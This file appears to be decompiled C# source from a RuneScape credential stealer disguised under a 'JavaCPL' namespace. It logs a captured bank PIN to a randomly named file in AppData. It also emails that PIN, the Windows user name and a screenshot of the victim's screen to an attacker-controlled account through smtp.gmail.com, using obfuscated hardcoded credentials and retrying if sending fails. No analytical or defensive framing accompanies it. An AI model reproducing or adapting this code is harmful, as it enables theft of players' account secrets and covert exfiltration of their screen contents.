using System;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Security.Principal;
using System.Text;

namespace JavaCPL;

public static class GClass6
{
	private static string smethod_0(int int_0, bool bool_0)
	{
		string text = "";
		Random random = new Random();
		for (int i = 0; i < int_0; i++)
		{
			char c = Convert.ToChar(Convert.ToInt32(Math.Floor(26.0 * random.NextDouble() + 65.0)));
			text += c;
		}
		if (bool_0)
		{
			return text.ToLower();
		}
		return text;
	}

	public static void smethod_1()
	{
		string text = "";
		foreach (int item in GClass1.list_0)
		{
			text += item;
		}
		text = text.Replace("-1", "X");
		TextWriter textWriter = new StreamWriter(Environment.GetEnvironmentVariable("AppData") + "/" + smethod_0(12, bool_0: false) + ".txt");
		textWriter.WriteLine(string.Concat(DateTime.Now, ": PIN: ", text));
		textWriter.Close();
	}

	public static string smethod_2(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.ASCII.GetString(bytes);
	}

	public static void smethod_3()
	{
		string text = "";
		foreach (int item in GClass1.list_0)
		{
			text += item;
		}
		text = text.Replace("-1", "X");
		string text2 = GForm0.smethod_1("yoM5V0REQj4kFKKo1zDpzV4aO4MvPG6T");
		string to = text2;
		string password = GForm0.smethod_1("acACYg2kjO3LKVIo92aA/w==");
		string text3 = WindowsIdentity.GetCurrent().Name.ToString();
		string subject = "RuneScape Bank Pin Found - " + text3;
		string body = "\r\n" + text3 + "\r\n" + text;
		string host = "smtp.gmail.com";
		MailMessage mailMessage = new MailMessage(text2, to, subject, body);
		try
		{
			string text4 = Environment.GetEnvironmentVariable("AppData") + "/" + smethod_0(12, bool_0: false) + ".png";
			((Image)GClass4.smethod_10(out var _)).Save(text4);
			mailMessage.Attachments.Add(new Attachment(text4));
			NetworkCredential credentials = new NetworkCredential(text2, password);
			SmtpClient smtpClient = new SmtpClient(host, 587);
			smtpClient.EnableSsl = true;
			smtpClient.UseDefaultCredentials = false;
			smtpClient.Credentials = credentials;
			smtpClient.DeliveryMethod = SmtpDeliveryMethod.Network;
			smtpClient.Send(mailMessage);
		}
		catch (Exception)
		{
			bool flag = false;
			while (flag)
			{
				flag = false;
			}
			try
			{
				NetworkCredential credentials2 = new NetworkCredential(text2, password);
				SmtpClient smtpClient2 = new SmtpClient(host, 587);
				smtpClient2.EnableSsl = true;
				smtpClient2.UseDefaultCredentials = false;
				smtpClient2.Credentials = credentials2;
				smtpClient2.DeliveryMethod = SmtpDeliveryMethod.Network;
				smtpClient2.Send(mailMessage);
			}
			catch (Exception)
			{
				flag = true;
			}
		}
	}
}
